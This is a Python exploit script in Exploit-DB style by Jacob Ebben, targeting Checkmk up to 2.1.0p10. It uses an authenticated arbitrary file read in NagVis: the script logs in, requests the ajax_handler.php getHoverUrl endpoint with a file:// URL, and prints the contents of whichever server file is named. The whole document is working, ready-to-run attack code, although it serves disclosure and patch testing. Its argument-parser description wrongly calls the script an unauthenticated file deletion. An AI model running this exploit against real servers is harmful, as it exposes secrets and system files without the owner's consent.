# Exploit Title: CheckMK - Authenticated Arbitrary File Read in NagVis
# Date: 27-03-2023
# Exploit Author: Jacob Ebben
# Version: Checkmk <= 2.1.0p10, Checkmk <= 2.0.0p27
# Tested on: CheckMK 2.1.0p10 - Official CheckMK Docker Image

#!/usr/bin/env python3

import argparse
import requests
import urllib3
import json
from termcolor import colored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def print_message(message, type):
    if type == 'SUCCESS':
        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
    elif type == 'INFO':
        print('[' + colored('INFO', 'blue') +  '] ' + message)
    elif type == 'WARNING':
        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
    elif type == 'ALERT':
        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
    elif type == 'ERROR':
        print('[' + colored('ERROR', 'red') +  '] ' + message)


class POC:
    def __init__(self, target, filename, username, password, proxy):
        self.base_url = self._get_normalized_url(target)
        self.filename = filename
        self.username = username
        self.password = password
        self.proxies = self._get_proxies(self.base_url, proxy) if proxy else {}

        self.session = requests.Session()


    def exploit(self):
        print_message("Starting login process ...", "INFO")
        self._login()
        print_message("Attempting to read specified file ...", "INFO")
        self._get_file_content()


    def _get_file_content(self):
        file_url = f"{self.base_url}nagvis/server/core/ajax_handler.php?mod=General&act=getHoverUrl&url[]=file://{self.filename}"
        file_result = self.session.get(file_url, proxies=self.proxies, verify=False)

        if "Call to undefined function" in file_result.text:
            print_message("The mbstring php extension is not installed on this instance!", "ERROR")
            print_message("The mbstring php extension has to be installed and enabled in the php.ini configuration file for the exploit to work ...", "INFO")
        elif "Permission denied" in file_result.text:
            print_message("The Checkmk service is not permitted to read the provided file!", "ERROR")
        elif "Not allowed url" in file_result.text:
            print_message("This Checkmk version is patched for this vulnerability!", "ERROR")
        elif "No such file or directory" in file_result.text:
            print_message("The provided file was not found on the system!", "ERROR")
        elif "Maybe the URL is password protected" in file_result.text or "remote host file access not supported" in file_result.text:
            print_message("Provided file name does not appear to be valid!", "ERROR")
        else:
            json_string = file_result.text[1:-1]
            json_object = json.loads(json_string)
            print_message(f"Here is the retrieved content of the file \"{self.filename}\"!", "SUCCESS")
            print(json_object["code"])

    def _login(self):
        print_message(f"Logging in with \"{self.username}:{self.password}\"!", "SUCCESS")
        login_url = self.base_url + "check_mk/login.py"
        login_result = self.session.post(
            login_url,
            files=(
                ('_username', (None, self.username)),
                ('_password', (None, self.password)),
                ('_login', (None, 'Login')),
            ),
            proxies=self.proxies,
            allow_redirects=False,
            verify=False
        )
        if login_result.status_code == 200:
            print_message("Login was not successful!", "ERROR")
            print_message("Are you sure the provided credentials are correct?", "INFO")
            exit()

    def _get_normalized_url(self, url):
        if url[-1] != '/':
            url += '/'
        if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
            url = "http://" + url
        return url

    def _get_proxies(self, target_url, proxy_url):
        return {self._get_url_protocol(target_url): self._get_normalized_url(proxy_url)}

    def _get_url_protocol(self, url):
        if url[0:8].lower() == 'https://':
            return 'https'
        return 'http'

def main():
    parser = argparse.ArgumentParser(description="CheckMK - Unauthenticated Arbitrary File Deletion")

    parser.add_argument('-t', '--target', required=True, type=str, help="url of the vulnerable site (Example: \"http://127.0.0.1/cmk/\" or \"https://checkmk.example.xyz/cmk/\")"),
    parser.add_argument('-f', '--filename', required=True, type=str, help="full path of file to read"),
    parser.add_argument('-u', '--username', required=True, type=str, help='valid username'),
    parser.add_argument('-p', '--password', required=True, type=str, help='valid password'),
    parser.add_argument('-x','--proxy', default=None, type=str, help='http proxy address (Example: http://127.0.0.1:8080/)')

    args = parser.parse_args()

    exploit = POC(args.target, args.filename, args.username, args.password, args.proxy)
    exploit.exploit()


if __name__ == "__main__":
    main()
